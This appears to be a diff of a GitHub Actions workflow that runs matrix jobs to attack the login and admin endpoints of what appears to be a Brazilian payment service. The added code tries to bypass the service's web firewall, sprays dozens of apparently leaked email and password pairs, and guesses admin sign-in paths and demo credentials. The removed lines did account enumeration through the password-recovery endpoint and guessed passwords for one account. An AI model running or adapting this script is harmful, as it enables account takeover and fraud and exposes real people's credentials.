@@ -1,4 +1,4 @@
-name: waf-registration-oracle
+name: waf-newcreds-spray
 on:
   workflow_dispatch:
 jobs:
@@ -6,20 +6,17 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]
+        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
       fail-fast: false
     steps:
     - name: attempt ${{ matrix.attempt }}
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
-        BUILDER="https://wpbuilderservices.wisepay.com.br/v1"
         
         MY_IP=$(curl -s https://api.ipify.org)
         RESP_CHECK=$(curl -s -m 15 -A "$UA" \
           -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
           -H "type-application: web" \
           -X POST "$BASE/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}')
@@ -31,65 +28,75 @@ jobs:
         
         echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
         
-        echo ""
-        echo "=== Oracle: users/theme de white-labels ==="
-        for SUBDOMAIN in "petcenterbrasil.wisepay.com.br" "acaiaca.wisepay.com.br" "hubio.wisepay.com.br" "poc.wisepay.com.br" "vale.wisepay.com.br" "omegpay.wisepay.com.br"; do
+        try_login() {
+          local EMAIL="$1"
+          local PASS="$2"
           R=$(curl -s -m 10 -A "$UA" \
-            -H "type-application: web" \
-            -H "Origin: https://$SUBDOMAIN" \
-            "$BASE/users/theme" -w "\n%{http_code}")
-          CODE=$(echo "$R" | tail -1)
-          BODY=$(echo "$R" | head -1 | head -c 300)
-          echo "THEME $CODE $SUBDOMAIN | $BODY"
-        done
-        
-        echo ""
-        echo "=== Oracle: password-recover (204=email existe) ==="
-        for EMAIL in "icelaserbelem@gmail.com" "lenildo.silva@outlook.com" "fabiane@petcenterbrasil.com.br" "andrejunior1223@gmail.com" "marco@vanityestetica.com.br"; do
-          R=$(curl -s -m 10 -A "$UA" \
-            -H "Content-Type: application/json" \
-            -H "type-application: web" \
-            -H "Origin: https://portal.wisepay.com.br" \
-            -X POST "$BASE/login/password-recover" \
-            -d "{\"email\":\"$EMAIL\"}" -w "\n%{http_code}")
-          CODE=$(echo "$R" | tail -1)
-          BODY=$(echo "$R" | head -1 | head -c 100)
-          echo "RECOVER $CODE $EMAIL | $BODY"
-        done
-        
-        echo ""
-        echo "=== Builder signup/register endpoints ==="
-        for EP in "/users/register" "/signup" "/register" "/users/create" "/companies" "/empresas"; do
-          R=$(curl -s -m 10 -A "$UA" \
-            -H "Content-Type: application/json" \
-            -X POST "$BUILDER$EP" \
-            -d '{"email":"teste@teste.com"}' -w "\n%{http_code}")
-          CODE=$(echo "$R" | tail -1)
-          BODY=$(echo "$R" | head -1 | head -c 100)
-          echo "BUILDER $CODE $EP | $BODY"
-        done
-        
-        echo ""
-        echo "=== Builder: listar empresas sem auth ==="
-        for EP in "/companies" "/empresas" "/white-labels" "/users"; do
-          R=$(curl -s -m 10 -A "$UA" \
-            -H "type-application: web" \
-            "$BUILDER$EP" -w "\n%{http_code}")
-          CODE=$(echo "$R" | tail -1)
-          BODY=$(echo "$R" | head -1 | head -c 100)
-          echo "BUILDER-GET $CODE $EP | $BODY"
-        done
-        
-        echo ""
-        echo "=== icelaserbelem - mais senhas ==="
-        for PASS in "ICE2021" "icelaser@2021" "ICEBELEM2021" "ICELASER@2021" "ICElaser2021" "icelaser2021!" "ICELASER1234" "icelaserbelem" "icelaser"; do
-          R=$(curl -s -m 8 -A "$UA" \
             -H "Content-Type: application/json" \
             -H "type-application: web" \
             -H "Origin: https://portal.wisepay.com.br" \
             -X POST "$BASE/login" \
-            -d "{\"email\":\"icelaserbelem@gmail.com\",\"password\":\"$PASS\"}" -w "\n%{http_code}")
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" -w "\n%{http_code}")
           CODE=$(echo "$R" | tail -1)
-          [ "$CODE" = "200" ] && echo "SUCCESS icelaserbelem:$PASS | $(echo $R | head -1 | head -c 200)" || echo "$CODE icelaserbelem:$PASS"
-          sleep 0.2
+          BODY=$(echo "$R" | head -1 | head -c 200)
+          echo "LOGIN $CODE | $EMAIL:$PASS | $BODY"
+          sleep 0.3
+        }
+        
+        echo ""
+        echo "=== NOVAS CREDENCIAIS PORTAL API ==="
+        try_login "ce.iguatu@acqiofranchising.com.br" "261297klBB*"
+        try_login "carmelita.antunes-ba@uol.com.br" "uzgvm157"
+        try_login "masbadio@inbox.com" "a1namein"
+        try_login "ienbger@yahoo.com" "xm1iem1"
+        try_login "kka46792ramnai@terra.es" "513l9didio5"
+        try_login "marcio.abreu@jhsbrasil.com.br" "135@mudar"
+        try_login "andersonmachado52@hotmail.com" "sinho1777"
+        try_login "marcelo.abreu002@gmail.com" "123123123"
+        try_login "adrianoo_assuncao@hotmail.com" "Davi2010"
+        try_login "janiele.santos.pereira@gmail.com" "12341234"
+        try_login "1opcaoretificafsa@gmail.com" "92329393"
+        try_login "pagcomsolucoes@gmail.com" "12341234"
+        try_login "ranchogourmet@outlook.com" "davi8909"
+        try_login "andrejunior1223@gmail.com" "12341234"
+        try_login "espacodacarnefsa@gmail.com" "espacodacarne"
+        try_login "espacodacarnefsa@gmail.com" "demopro"
+        try_login "nancyfigueredo@hotmail.com" "12341234"
+        try_login "dindo_spfc@hotmail.com" "12341234"
+        try_login "suporte@criatek.com.br" "pbo@1006581"
+        try_login "juci64@hotmail.com" "pbo@100681"
+        try_login "juci64@hotmail.com" "espaco2022"
+        try_login "JUCI64@HOTMAIL.COM" "espaco2022"
+        try_login "acaiacafinanceiro@gmail.com" "13467913"
+        try_login "financeiro@jksalimentos.com.br" "12341234"
+        try_login "niveareis@gmail.com" "937495jeF"
+        try_login "criatek.ti@gmail.com" "Laurab2308"
+        
+        echo ""
+        echo "=== ADMIN RAILS: DESCOBRIR PATH ==="
+        for PATH in "/" "/users/sign_in" "/admin" "/login" "/sign_in" "/admin/sign_in" "/backoffice"; do
+          R=$(curl -s -m 10 -A "$UA" -o /dev/null -w "%{http_code}\n%{redirect_url}" "https://admin.wisepay.com.br$PATH")
+          echo "ADMIN_RAILS | $PATH | $R"
+        done
+        
+        echo ""
+        echo "=== ADMIN RAILS: demo:demopro POST ==="
+        for SIGN_PATH in "/users/sign_in" "/sign_in" "/admin/sign_in"; do
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -c /tmp/admin_cookies.txt -b /tmp/admin_cookies.txt \
+            -X POST "https://admin.wisepay.com.br$SIGN_PATH" \
+            -d "user[email]=demo&user[password]=demopro&authenticity_token=CSRF" -w "\n%{http_code}")
+          CODE=$(echo "$R" | tail -1)
+          BODY=$(echo "$R" | head -1 | head -c 150)
+          echo "ADMIN_POST $CODE | $SIGN_PATH | $BODY"
+          
+          # Tentar JSON também
+          R2=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" -H "Accept: application/json" \
+            -X POST "https://admin.wisepay.com.br$SIGN_PATH" \
+            -d '{"email":"demo","password":"demopro"}' -w "\n%{http_code}")
+          CODE2=$(echo "$R2" | tail -1)
+          BODY2=$(echo "$R2" | head -1 | head -c 150)
+          echo "ADMIN_JSON $CODE2 | $SIGN_PATH | $BODY2"
         done
